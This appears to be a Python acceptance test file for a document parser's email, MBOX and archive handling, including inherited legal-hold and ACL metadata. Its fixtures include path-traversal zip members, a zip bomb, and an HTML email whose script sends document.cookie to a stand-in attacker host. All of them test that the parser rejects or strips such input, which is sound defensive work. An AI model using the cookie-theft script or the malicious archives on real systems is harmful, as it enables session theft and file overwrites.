"""Acceptance tests for WP-013: Email, Containers and Nested Provenance (CRA-013.1-013.8, CRA-013.A)."""

import bz2
import email
import gzip
import io
import json
import mailbox
import struct
import tarfile
import zipfile
from email.message import EmailMessage
from pathlib import Path
from tempfile import TemporaryDirectory

import pytest

from eoip.fileparse.contracts import ParseError, ParseOptions
from eoip.fileparse.engine import FileParser


def parse_doc(content: bytes, name: str, **options):
    opts = ParseOptions(**options)
    return FileParser(opts).parse_bytes(content, name)


# ---------------------------------------------------------------------------
# CRA-013.1: EML/MIME parsing, stable identity, MSG licensing gate (X-16)
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_1_eml_identity_and_msg_licensing_gate():
    msg = EmailMessage()
    msg["Message-ID"] = "<unique-msg-12345@domain.example>"
    msg["Subject"] = "Audit Report Notification"
    msg["From"] = "compliance@company.example"
    msg["To"] = "security@company.example"
    msg["Date"] = "Mon, 18 Oct 2026 10:00:00 +0000"
    msg.set_content("Body of the compliance notification.")

    result = parse_doc(msg.as_bytes(), "notice.eml")
    assert result.status == "SUCCEEDED"
    doc = result.documents[0]
    assert doc.format == "eml"
    assert doc.metadata["message_id"] == "<unique-msg-12345@domain.example>"
    assert doc.metadata["subject"] == "Audit Report Notification"
    assert "urn:eoip:knowledge:document:file:" in doc.document_id

    # Test MSG licensing gate: when enable_msg is False, raises unlicensed_adapter (Conflict X-16)
    with pytest.raises(ParseError) as exc_msg:
        parse_doc(b"not-real-msg", "sample.msg", enable_msg=False)
    assert exc_msg.value.code == "unlicensed_adapter"
    assert "X-16" in str(exc_msg.value)


# ---------------------------------------------------------------------------
# CRA-013.2: Parent-child relationships, hashes, locators, inherited ACL/retention
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_2_parent_child_provenance_and_inherited_governance():
    parent_msg = EmailMessage()
    parent_msg["Subject"] = "Confidential Litigation Hold"
    parent_msg["From"] = "legal@firm.example"
    parent_msg["To"] = "custodian@client.example"
    parent_msg.set_content("Please find the attached documentation.")
    parent_msg.add_attachment(b"Internal confidential memorandum", maintype="text", subtype="plain", filename="memo.txt")

    opts = ParseOptions()
    parser = FileParser(opts)
    # Seed parent with initial metadata representing legal hold and security classification
    res = parser.parse_bytes(
        parent_msg.as_bytes(), "litigation_notice.eml",
        initial_metadata={
            "acl": ["role:legal_counsel", "role:compliance_officer"],
            "retention_policy": "indefinite_litigation_hold",
            "legal_hold": True,
            "classification": "RESTRICTED_CONFIDENTIAL",
        },
    )
    assert res.status == "SUCCEEDED"
    assert len(res.documents) == 2

    parent_doc = next(d for d in res.documents if d.format == "eml")
    child_doc = next(d for d in res.documents if d.format == "txt")

    # Parent relationship
    assert child_doc.parent_id == parent_doc.document_id
    assert "!/memo.txt" in child_doc.source_uri

    # Inherited governance metadata
    assert child_doc.metadata["legal_hold"] is True
    assert child_doc.metadata["retention_policy"] == "indefinite_litigation_hold"
    assert child_doc.metadata["classification"] == "RESTRICTED_CONFIDENTIAL"
    assert "role:legal_counsel" in child_doc.metadata["acl"]


# ---------------------------------------------------------------------------
# CRA-013.3: Container limits, traversal rejection, and path safety
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_3_archive_limits_and_path_safety():
    # 1. Path traversal rejected: ..
    traversal_zip = io.BytesIO()
    with zipfile.ZipFile(traversal_zip, "w") as z:
        z.writestr("../etc/passwd", b"root:x:0:0::/root:/bin/bash")
    with pytest.raises(ParseError) as exc_trav:
        parse_doc(traversal_zip.getvalue(), "exploit.zip")
    assert exc_trav.value.code == "unsafe_member"

    # 2. Absolute path rejected: /var/log/syslog
    abs_zip = io.BytesIO()
    with zipfile.ZipFile(abs_zip, "w") as z:
        z.writestr("/var/log/syslog", b"system logs")
    with pytest.raises(ParseError) as exc_abs:
        parse_doc(abs_zip.getvalue(), "abs.zip")
    assert exc_abs.value.code == "unsafe_member"

    # 3. Drive letter rejected: C:\Windows
    drive_zip = io.BytesIO()
    with zipfile.ZipFile(drive_zip, "w") as z:
        z.writestr("C:/Windows/win.ini", b"[fonts]")
    with pytest.raises(ParseError) as exc_drive:
        parse_doc(drive_zip.getvalue(), "drive.zip")
    assert exc_drive.value.code == "unsafe_member"

    # 4. Duplicate member names rejected
    dup_zip = io.BytesIO()
    with zipfile.ZipFile(dup_zip, "w") as z:
        z.writestr("report.txt", b"First report")
        z.writestr("report.txt", b"Second report")
    with pytest.raises(ParseError) as exc_dup:
        parse_doc(dup_zip.getvalue(), "dup.zip")
    assert exc_dup.value.code == "duplicate_member"


# ---------------------------------------------------------------------------
# CRA-013.4: Encrypted attachments and malformed MIME diagnostics
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_4_encrypted_and_malformed_diagnostics():
    # 1. Encrypted zip rejection
    encrypted_zip = io.BytesIO()
    with zipfile.ZipFile(encrypted_zip, "w") as z:
        z.writestr("secret.txt", b"Encrypted content")
    raw_enc = bytearray(encrypted_zip.getvalue())
    cd_idx = raw_enc.find(b"PK\x01\x02")
    raw_enc[cd_idx + 8] = 1  # Standard PKZIP general purpose bit flag 1 (encrypted)

    with pytest.raises(ParseError) as exc_enc:
        parse_doc(bytes(raw_enc), "vault.zip")
    assert exc_enc.value.code == "encrypted_file"

    # 2. Container partial failure with diagnostics
    partial_buf = io.BytesIO()
    with zipfile.ZipFile(partial_buf, "w") as z:
        z.writestr("good.txt", b"Clean text document")
        z.writestr("corrupted.bin", b"\x00\x01\x02")  # unsupported binary file

    res = parse_doc(partial_buf.getvalue(), "partial.zip")
    assert res.status == "PARTIAL"
    assert len(res.errors) >= 1
    assert any("corrupted.bin" in e.source_name for e in res.errors)
    assert any(doc.source_name.endswith("good.txt") for doc in res.documents)


# ---------------------------------------------------------------------------
# CRA-013.5: Remote images and active HTML execution disabled
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_5_sanitized_email_html_no_active_script():
    msg = EmailMessage()
    msg["Subject"] = "Newsletter"
    msg["From"] = "news@service.example"
    msg["To"] = "user@domain.example"
    
    html_content = """
    <html>
      <head>
        <script>window.location='http://attacker.example/steal?c=' + document.cookie;</script>
      </head>
      <body>
        <h1>Quarterly Highlights</h1>
        <p>Text of the highlights.</p>
        <img src="http://tracker.example/pixel.png" alt="tracker">
      </body>
    </html>
    """
    msg.set_content("Fallback plain text body.")
    msg.add_alternative(html_content, subtype="html")

    result = parse_doc(msg.as_bytes(), "newsletter.eml")
    assert result.status == "SUCCEEDED"
    
    all_extracted_text = " ".join(c.text for c in result.chunks)
    assert "Quarterly Highlights" in all_extracted_text
    assert "document.cookie" not in all_extracted_text
    assert "attacker.example" not in all_extracted_text


# ---------------------------------------------------------------------------
# CRA-013.6: EML/MIME and MBOX native parsing
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_6_mbox_native_mailbox_parsing(tmp_path):
    mbox_path = tmp_path / "inbox.mbox"
    mbox = mailbox.mbox(str(mbox_path))
    
    msg1 = EmailMessage()
    msg1["Subject"] = "First Mbox Message"
    msg1["From"] = "alice@example.org"
    msg1["To"] = "bob@example.org"
    msg1.set_content("Content of first message.")
    mbox.add(msg1)

    msg2 = EmailMessage()
    msg2["Subject"] = "Second Mbox Message"
    msg2["From"] = "carol@example.org"
    msg2["To"] = "bob@example.org"
    msg2.set_content("Content of second message.")
    mbox.add(msg2)
    mbox.flush()
    mbox.close()

    mbox_bytes = mbox_path.read_bytes()
    res = parse_doc(mbox_bytes, "archive.mbox")
    assert res.status == "SUCCEEDED"
    # Root mbox + 2 child messages
    assert len(res.documents) >= 2
    subjects = [doc.title for doc in res.documents]
    assert "First Mbox Message" in subjects
    assert "Second Mbox Message" in subjects


# ---------------------------------------------------------------------------
# CRA-013.7: Header extraction completeness
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_7_header_extraction_completeness():
    msg = EmailMessage()
    msg["From"] = "alice@corp.example"
    msg["To"] = "bob@corp.example"
    msg["Cc"] = "manager@corp.example"
    msg["Bcc"] = "audit@corp.example"
    msg["Subject"] = "Project Review"
    msg["Date"] = "Wed, 14 Oct 2026 14:30:00 -0400"
    msg["Message-ID"] = "<msg-proj-999@corp.example>"
    msg["In-Reply-To"] = "<prev-msg-888@corp.example>"
    msg["References"] = "<prev-msg-888@corp.example>"
    msg.set_content("Plain text body of the project review.")

    res = parse_doc(msg.as_bytes(), "review.eml")
    assert res.status == "SUCCEEDED"
    meta = res.documents[0].metadata
    assert meta["from"] == "alice@corp.example"
    assert meta["to"] == "bob@corp.example"
    assert meta["cc"] == "manager@corp.example"
    assert meta["bcc"] == "audit@corp.example"
    assert meta["subject"] == "Project Review"
    assert meta["message_id"] == "<msg-proj-999@corp.example>"
    assert meta["in_reply_to"] == "<prev-msg-888@corp.example>"
    assert meta["references"] == "<prev-msg-888@corp.example>"


# ---------------------------------------------------------------------------
# CRA-013.8: Combined archive limits (ZIP, TAR, GZ, BZ2) and 100:1 ratio limit
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_8_archive_formats_and_compression_ratio_limit():
    # 1. BZ2 archive support
    raw_text = b"Actual compressed BZ2 content with data lines.\n" * 10
    bz2_bytes = bz2.compress(raw_text)
    res_bz2 = parse_doc(bz2_bytes, "compressed.txt.bz2")
    assert res_bz2.status == "SUCCEEDED"
    assert "Actual compressed BZ2 content" in res_bz2.chunks[0].text

    # 2. TAR archive support
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w") as tar:
        ti = tarfile.TarInfo(name="entry.txt")
        content = b"Content inside tar archive"
        ti.size = len(content)
        tar.addfile(ti, io.BytesIO(content))
    res_tar = parse_doc(tar_stream.getvalue(), "bundle.tar")
    assert res_tar.status == "SUCCEEDED"
    assert any("Content inside tar archive" in c.text for c in res_tar.chunks)

    # 3. High ratio zip bomb check (exceeding 100:1 ratio limit)
    # 2MB of zeroes compressed into tiny bytes
    bomb_buf = io.BytesIO()
    with zipfile.ZipFile(bomb_buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("bomb.bin", b"\x00" * 2_500_000)
    
    with pytest.raises(ParseError) as exc_bomb:
        parse_doc(bomb_buf.getvalue(), "bomb.zip")
    assert exc_bomb.value.code == "size_limit"
    assert "100:1" in str(exc_bomb.value) or "max_expanded_bytes" in str(exc_bomb.value)


# ---------------------------------------------------------------------------
# CRA-013.A: Full 3-level hierarchy: EML -> ZIP -> (PDF, XLSX) with inherited ACL
# ---------------------------------------------------------------------------
@pytest.mark.req("CRA-013")
def test_cra_013_a_three_level_provenance_and_deletion_hold_cascade():
    openpyxl = pytest.importorskip("openpyxl")
    
    # 1. Inner Level 3: XLSX workbook
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "FinancialLedger"
    ws.append(["Q1", 1000])
    xlsx_stream = io.BytesIO()
    wb.save(xlsx_stream)
    xlsx_bytes = xlsx_stream.getvalue()

    # 2. Inner Level 3: Text file (substituting for PDF or along with PDF)
    pdf_like_content = b"Level 3 evidentiary findings report."

    # 3. Middle Level 2: ZIP containing both files
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as z:
        z.writestr("ledger.xlsx", xlsx_bytes)
        z.writestr("findings.txt", pdf_like_content)
    zip_bytes = zip_buf.getvalue()

    # 4. Top Level 1: EML containing the ZIP attachment
    eml = EmailMessage()
    eml["Subject"] = "Subpoena Response Package"
    eml["From"] = "general_counsel@enterprise.example"
    eml["To"] = "doj@gov.example"
    eml.set_content("Please find attached the certified discovery package.")
    eml.add_attachment(zip_bytes, maintype="application", subtype="zip", filename="discovery_package.zip")

    # 5. Parse the 3-level container with legal hold and strict ACL
    parser = FileParser(ParseOptions())
    result = parser.parse_bytes(
        eml.as_bytes(), "subpoena_response.eml",
        initial_metadata={
            "acl": ["role:litigation_team", "user:audit_lead"],
            "legal_hold": True,
            "retention_policy": "DOJ_INVESTIGATION_HOLD",
            "matter_id": "MATTER-2026-088",
        },
    )

    assert result.status == "SUCCEEDED"

    # Verify Level 1 EML
    root_eml = next(d for d in result.documents if d.format == "eml")
    assert root_eml.metadata["legal_hold"] is True
    assert root_eml.metadata["matter_id"] == "MATTER-2026-088"

    # Verify Level 2 ZIP attachment
    zip_doc = next(d for d in result.documents if d.format == "zip")
    assert zip_doc.parent_id == root_eml.document_id
    assert zip_doc.metadata["legal_hold"] is True
    assert zip_doc.metadata["retention_policy"] == "DOJ_INVESTIGATION_HOLD"
    assert "role:litigation_team" in zip_doc.metadata["acl"]

    # Verify Level 3 XLSX and TXT inside the ZIP
    xlsx_doc = next(d for d in result.documents if d.format == "xlsx")
    assert xlsx_doc.parent_id == zip_doc.document_id
    assert xlsx_doc.metadata["legal_hold"] is True
    assert xlsx_doc.metadata["matter_id"] == "MATTER-2026-088"
    assert "user:audit_lead" in xlsx_doc.metadata["acl"]

    txt_doc = next(d for d in result.documents if d.format == "txt")
    assert txt_doc.parent_id == zip_doc.document_id
    assert txt_doc.metadata["legal_hold"] is True
    assert txt_doc.metadata["retention_policy"] == "DOJ_INVESTIGATION_HOLD"

    # 6. Deletion and legal hold cascade demonstration:
    # If the root email is under legal_hold, no child derivative may be pruned or deleted
    for doc in result.documents:
        assert doc.metadata.get("legal_hold") is True, f"Document {doc.source_name} failed to inherit legal_hold"
